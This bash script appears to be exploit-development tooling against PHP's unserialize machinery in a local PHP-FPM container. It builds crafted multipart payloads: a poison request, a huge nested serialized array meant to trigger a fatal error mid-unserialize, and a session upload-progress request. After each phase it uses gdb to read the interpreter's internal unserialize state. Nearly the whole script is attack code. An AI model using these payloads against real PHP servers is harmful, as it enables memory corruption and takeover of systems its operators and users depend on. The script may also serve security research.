#!/usr/bin/env bash
# Read BG(unserialize).data/level directly after each phase, no long-running gdb.
set -u
SID="f2sre00000000000000000000000003"

read_bg() {
  local PID
  PID=$(docker exec f2s-php pgrep -f 'pool www' | head -1)
  docker exec f2s-php gdb -batch -p "$PID" \
    -ex 'printf "BG data=%#lx level=%d\\n", *(unsigned long*)((char*)&basic_globals+0x358), *(int*)((char*)&basic_globals+0x360)' \
    -ex detach 2>/dev/null | grep '^BG'
}

post() {  # $1=path $2=bodyfile $3=sid
  python3 - "$1" "$2" "$3" <<'PYEOF'
import sys, http.client
path, bf, sid = sys.argv[1], sys.argv[2], sys.argv[3]
body = open(bf, "rb").read()
B = b"----f2sm3bgread00000"
c = http.client.HTTPConnection("127.0.0.1", 18120, timeout=120)
c.request("POST", path, body=body, headers={
  "Content-Type": f"multipart/form-data; boundary={B.decode()}",
  "Content-Length": str(len(body)), "Cookie": f"PHPSESSID={sid}"})
r = c.getresponse(); print(f"[{path}]", r.status, r.read(50).decode("latin1","replace")[:40]); c.close()
PYEOF
}

mkbody() {  # $1=out $2=mode
  python3 - "$1" "$2" "$SID" <<'PYEOF'
import sys
out, mode, sid = sys.argv[1], sys.argv[2], sys.argv[3]
B = b"----f2sm3bgread00000"
def part(n, b, fn=None):
    d = f'Content-Disposition: form-data; name="{n}"'
    if fn is not None: d += f'; filename="{fn}"'
    return b"--"+B+b"\r\n"+d.encode()+b"\r\n\r\n"+b+b"\r\n"
if mode == "poison":
    body = part("poison", b"65536") + b"--"+B+b"--\r\n"
elif mode == "fatal":
    elems = b"".join(b"i:%d;a:1:{i:0;i:1;}" % i for i in range(40000))
    body = part("filler", b"Q"*4000000) + part("data", b"a:%d:{%s}" % (40000, elems)) + b"--"+B+b"--\r\n"
elif mode == "progress":
    body = (part("PHPSESSID", sid.encode()) + part("PHP_SESSION_UPLOAD_PROGRESS", b"bg1")
            + part("f", b"", fn="a") + b"--"+B+b"--\r\n")
open(out, "wb").write(body)
PYEOF
}

TMP=$(mktemp -d)
mkbody "$TMP/poison" poison; mkbody "$TMP/fatal" fatal; mkbody "$TMP/progress" progress

docker exec f2s-php sh -c "kill \$(pgrep -f 'pool www') 2>/dev/null"; sleep 1.5
echo "[i] fresh worker: $(docker exec f2s-php pgrep -f 'pool www' | head -1)"
read_bg
post /poison.php "$TMP/poison" "$SID"; sleep 0.4; echo -n "[after poison] "; read_bg
post /index.php "$TMP/fatal" "$SID"; sleep 0.5; echo -n "[after fatal ] "; read_bg
post /index.php "$TMP/progress" "$SID"; sleep 0.5; echo -n "[after B     ] "; read_bg
rm -rf "$TMP"
